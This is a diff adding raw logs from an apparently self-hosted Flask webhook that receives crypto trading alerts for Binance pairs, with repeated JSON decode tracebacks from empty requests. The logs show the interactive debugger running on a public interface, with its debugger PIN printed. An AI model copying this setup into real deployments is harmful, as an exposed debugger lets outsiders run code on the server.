@@ -1507,3 +1507,2880 @@ b'D-RSI Long BINANCE:COMPUSDT'
 52.32.178.7 - - [12/Jul/2023 15:59:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.000798
 (21914) accepted ('34.212.75.30', 44202)
 34.212.75.30 - - [12/Jul/2023 15:59:01] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.000945
+ * Detected change in '/home/ec2-user/binance-api/flask_app/trview/api.py', reloading
+b'"long",\n    "market_position_size": "1.564",\n    "order_id": "long",\n   '
+ b' "price": "66.4",\n    "ticker": "COMPUSDT",\n    "firetime" : "2023-07-12'
+ b'T12:55:02Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:56:00-----------------------------'
+b'D-RSI Long BINANCE:ETHUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:56:00-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "buy",\n    "contracts": "0.017", \n    "market_position": '
+ b'"long",\n    "market_position_size": "0.0085",\n    "order_id": "long",\n  '
+ b'  "price": "1886.6200000000001",\n    "ticker": "ETHUSDT",\n    "firetime"'
+ b' : "2023-07-12T12:56:00Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:57:01-----------------------------'
+b'D-RSI Long BINANCE:MATICUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:57:01-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "buy",\n    "contracts": "36.85", \n    "market_position": '
+ b'"long",\n    "market_position_size": "18.528",\n    "order_id": "long",\n  '
+ b'  "price": "0.7367",\n    "ticker": "MATICUSDT",\n    "firetime" : "2023-0'
+ b'7-12T12:57:00Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:57:04-----------------------------'
+b'D-RSI Long BINANCE:LTCUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:57:04-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "buy",\n    "contracts": "0.28", \n    "market_position": "'
+ b'long",\n    "market_position_size": "0.14",\n    "order_id": "long",\n    "'
+ b'price": "96.66",\n    "ticker": "LTCUSDT",\n    "firetime" : "2023-07-12T1'
+ b'2:57:03Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:58:01-----------------------------'
+b'D-RSI Long BINANCE:VETUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:58:01-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "buy",\n    "contracts": "1316.52", \n    "market_position"'
+ b': "long",\n    "market_position_size": "658.459",\n    "order_id": "long",'
+ b'\n    "price": "0.019",\n    "ticker": "VETUSDT",\n    "firetime" : "2023-0'
+ b'7-12T12:58:00Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:59:01-----------------------------'
+b'D-RSI Long BINANCE:SOLUSDT'
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+'--------------------------------------------------------------------------------------'
+'----------------------------2023-07-12 15:59:01-----------------------------'
+(b'    {\n    "strategy_name" : "drsi_with_filters",\n    "alert_message":"",'
+ b'\n    "action": "buy",\n    "contracts": "1.182", \n    "market_position": '
+ b'"long",\n    "market_position_size": "0.592",\n    "order_id": "long",\n   '
+ b' "price": "22.330000000000002",\n    "ticker": "SOLUSDT",\n    "firetime" '
+ b': "2023-07-12T12:59:00Z",\n    "interval" : "1"\n    }')
+<class 'bytes'>
+'--------------------------------------------------------------------------------------'
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 389-553-210
+(22236) wsgi starting up on http://0.0.0.0:80
+(22236) accepted ('151.135.4.55', 59884)
+151.135.4.55 - - [12/Jul/2023 16:12:04] "POST /api/drsi_with_filters HTTP/1.1" 200 153 0.002500
+(22236) accepted ('52.32.178.7', 39160)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:12:06] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.007863
+(22236) accepted ('34.212.75.30', 22906)
+(22236) accepted ('52.32.178.7', 39172)
+(22236) accepted ('52.32.178.7', 39174)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:12:06] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004939
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:12:06] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004263
+52.32.178.7 - - [12/Jul/2023 16:12:06] "POST /api/drsi_with_filters HTTP/1.1" 200 148 0.000951
+(22236) accepted ('52.32.178.7', 39734)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:12:11] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004438
+(22236) accepted ('34.212.75.30', 23462)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:12:11] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004079
+(22236) accepted ('34.212.75.30', 23468)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:12:11] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004084
+(22236) accepted ('34.212.75.30', 24058)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:12:16] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004338
+(22236) accepted ('52.32.178.7', 40348)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:12:16] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004621
+(22236) accepted ('52.32.178.7', 40352)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:12:16] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004116
+(22236) accepted ('34.212.75.30', 24554)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:12:22] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004241
+(22236) accepted ('34.212.75.30', 24560)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+34.212.75.30 - - [12/Jul/2023 16:12:22] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004044
+(22236) accepted ('52.32.178.7', 40850)
+Traceback (most recent call last):
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2193, in wsgi_app
+    response = self.handle_exception(e)
+               ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 2190, in wsgi_app
+    response = self.full_dispatch_request()
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1486, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1484, in full_dispatch_request
+    rv = self.dispatch_request()
+         ^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/venv/lib64/python3.11/site-packages/flask/app.py", line 1469, in dispatch_request
+    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ec2-user/binance-api/flask_app/trview/api.py", line 119, in drsi_with_filters
+    rd =  json.loads(request.data)
+          ^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/__init__.py", line 346, in loads
+    return _default_decoder.decode(s)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 337, in decode
+    obj, end = self.raw_decode(s, idx=_w(s, 0).end())
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib64/python3.11/json/decoder.py", line 355, in raw_decode
+    raise JSONDecodeError("Expecting value", s, err.value) from None
+json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)
+52.32.178.7 - - [12/Jul/2023 16:12:22] "POST /api/drsi_with_filters HTTP/1.1" 500 18352 0.004500
+151.135.4.55 - - [12/Jul/2023 16:12:32] "POST /api/drsi_with_filters HTTP/1.1" 200 153 0.001202
